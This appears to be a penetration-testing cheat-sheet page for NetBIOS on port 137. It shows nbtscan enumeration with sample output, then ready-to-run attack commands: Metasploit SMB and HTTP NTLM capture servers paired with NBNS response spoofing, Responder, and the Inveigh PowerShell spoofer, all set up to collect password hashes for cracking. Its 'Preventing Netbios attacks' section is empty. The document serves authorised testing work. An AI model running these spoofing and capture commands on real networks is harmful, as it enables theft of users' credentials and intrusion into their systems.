# 137 - Netbios

### Broadcast discovery

```
nbtscan 172.18.2.0/24
	
172.18.2.9:GCDTA0000:00U
172.18.2.9:WORKGROUP:00G
172.18.2.9:GCDTA0000:20U
172.18.2.9:MAC:00-23-7d-aa-72-c2
```

### nbt-wizz version version:

Download:

```
wget http://www.unixwiz.net/tools/nbtscan-1.0.35-redhat-linux
```

```
root@Kali:~/Downloads# ./nbtscan-1.0.35-redhat-linux -A 192.168.0.15 
192.168.0.38    WORKGROUP\DOOKOSSEL             SHARING 
  DOOKOSSEL      <00> UNIQUE Workstation Service 
  DOOKOSSEL      <03> UNIQUE Messenger Service<3> 
  DOOKOSSEL      <20> UNIQUE File Server Service 
  ..__MSBROWSE__.<01> GROUP  Master Browser 
  WORKGROUP      <00> GROUP  Domain Name 
  WORKGROUP      <1d> UNIQUE Master Browser 
  WORKGROUP      <1e> GROUP  Browser Service Elections 
  00:00:00:00:00:00   ETHER
```

### Windows NBTSCAN

{% embed url="http://www.unixwiz.net/tools/nbtscan-1.0.35.exe" %}

### Netbios Spoofing

#### Metasploit

```
use auxiliary/server/capture/smb
set CAINPWFILE /netbios/cain.
set JOHNPWFILE /netbios/john. 

set LOGFILE /netbios/SMB_LOG.txt
set SRVHOST 10.222.101.213
run
	
use auxiliary/server/capture/http_ntlm
set CAINPWFILE /netbios/cain-http
set JOHNPWFILE /netbios/john-http
set SRVHOST 10.222.101.213
set SRVPORT 80
set URIPATH /
run
	
use auxiliary/spoof/nbns/nbns_response
set INTERFACE eth0
set SPOOFIP 10.222.101.213
run
```

### Capture Netbios broadcasts

#### Responder

```
sudo python3.9 /usr/share/responder/Responder.py -I eth0 -w -f -v
```

#### Inveigh - (Powershell Responder)

requires privileged user.

https://n0where.net/windows-powershell-llmnrnbns-spoofer-inveigh\
https://github.com/Kevin-Robertson/Inveigh

```
cd C:\Users\Leon\powermenu\Inveigh\Inveigh-master
Import-Module .\Inveigh.psm1
```

To execute with default settings

```
Invoke-Inveigh
```

To execute with features enabled/disabled

```
Invoke-Inveigh -LLMNR Y -NBNS Y -HTTP Y -HTTPS Y -SMB Y -ConsoleOutput Y -IP <yourIP>
```

You must Stop Inveigh manually

```
Stop-Inveigh
```

### Preventing Netbios attacks
